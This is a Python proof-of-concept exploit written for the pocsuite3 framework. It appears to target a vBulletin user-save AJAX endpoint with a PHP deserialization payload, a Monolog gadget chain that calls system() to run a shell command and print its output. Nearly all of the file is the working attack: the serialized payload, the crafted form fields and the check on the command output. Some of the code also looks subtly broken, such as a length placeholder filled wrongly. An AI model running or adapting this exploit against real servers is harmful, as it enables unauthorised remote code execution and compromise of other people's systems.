#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin, urlparse
import re
minimum_version_required('1.9.11')


class DemoPOC(POCBase):
    appName = ''


    def _verify(self):
        proxy = '127.0.0.1:8080'
        proxies = {
            'http': 'http://' + proxy,
            'https': 'https://' + proxy,
        }
        result = {}
        marker = 'testvb'
        command1 = b'id'
        param1 = f"echo {marker}::; {command1}; echo ::{marker}"
        param = bytes(param1.encode())
        payload = (
        b'a:2:{i:0;O:27:"googlelogin_vendor_autoload":0:{}i:1;O:32:"Monolog\\Handle'
        b'r\\SyslogUdpHandler":1:{s:9:"\x00*\x00socket";O:29:"Monolog\\Handler\\Buf'
        b'ferHandler":7:{s:10:"\x00*\x00handler";r:4;s:13:"\x00*\x00bufferSize";i:-1;s'
        b':9:"\x00*\x00buffer";a:1:{i:0;a:2:{i:0;s:[LEN]:"[COMMAND]";s:5:"level";N;}}s:8:"\x00'
        b'*\x00level";N;s:14:"\x00*\x00initialized";b:1;s:14:"\x00*\x00bufferLimit";i'
        b':-1;s:13:"\x00*\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}}'
            )
        payload = payload.replace(b"[LEN]",bytes(len(command1)))
        payload = payload.replace(b"[COMMAND]",param)

        datas = {
            "adminoptions": "",
            "options": "",
            "password": "password",
            "securitytoken": "guest",
            "user[email]": "pown@pown.net",
            "user[password]": "password",
            "user[searchprefs]": payload,
            "user[username]": "toto",
            "userfield": "",
            "userid": "0",
        }
        url = urljoin(self.url,'/ajax/api/user/save')
        res = requests.post(url,data=datas,proxies=proxies)
        if res.status_code == 200:
            result1 = re.search(fr'{marker}::(.*)::{marker}',res.text).group(0)
            result = {'VerifyInfo':{command1:result1}}

            return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
